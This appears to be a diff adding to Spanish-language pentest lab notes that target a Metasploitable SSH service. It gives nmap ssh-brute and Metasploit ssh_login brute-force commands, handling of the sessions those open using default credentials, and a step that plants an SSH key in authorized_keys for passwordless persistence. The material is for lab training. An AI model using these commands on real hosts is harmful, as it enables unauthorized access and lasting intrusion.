@@ -283,3 +283,79 @@ ssh-audit server.local -p 22
 ssh-audit server.local -p 2299
 ```
 
+
+- fuerza bruta con nmap
+
+```sh
+USERNAMES_LIST=/lab/common_users.txt
+PASSWORDS_LIST=/lab/common_passwords.txt
+
+nmap -p22,2299 -sV server.local -v --script=ssh-brute --script-args=userdb=./$USERNAMES_LIST,passdb=./$PASSWORDS_LIST
+```
+
+- fuerza bruta con metasploit
+
+```sh
+# sudo msfconsole
+
+use auxiliary/scanner/ssh/ssh_login
+options
+
+set RHOSTS 172.26.10.12
+set USERPASS_FILE /lab/common_userpass.txt
+run
+
+set RPORT 2299
+run
+
+creds
+
+# ---
+
+sessions -l
+
+sessions -n "msfadmin:msfadmin" -i 1
+sessions -n "postgres:postgres" -i 2
+sessions -n "service:service" -i 3
+sessions -n "user:user" -i 4
+sessions -n "vagrant:vagrant" -i 5
+
+sessions 1
+{
+pwd
+whoami
+
+ls -la
+
+# ...
+}
+```
+
+
+- conexión SSH
+
+```sh
+# En Kali, generar clave SSH si no existe
+ssh-keygen -t rsa -C "kali@kali" -N "" -f ~/.ssh/id_rsa
+cat ~/.ssh/id_rsa.pub # COPIAR
+
+# ---
+
+# En Kali, conectar al servicio SSH de Metasploitable
+ssh -oHostKeyAlgorithms=ssh-rsa -oPubkeyAcceptedAlgorithms=ssh-rsa user@server.local -p22
+
+# ---
+
+# En la sesión SSH
+cat << EOF >> ~/.ssh/authorized_keys
+# ...
+EOF
+
+exit
+
+# ---
+
+# En Kali, volver a conectar al servicio SSH de Metasploitable (AHORA NO PIDE CONTRASEÑA)
+ssh -oHostKeyAlgorithms=ssh-rsa -oPubkeyAcceptedAlgorithms=ssh-rsa user@server.local -p22
+```
+
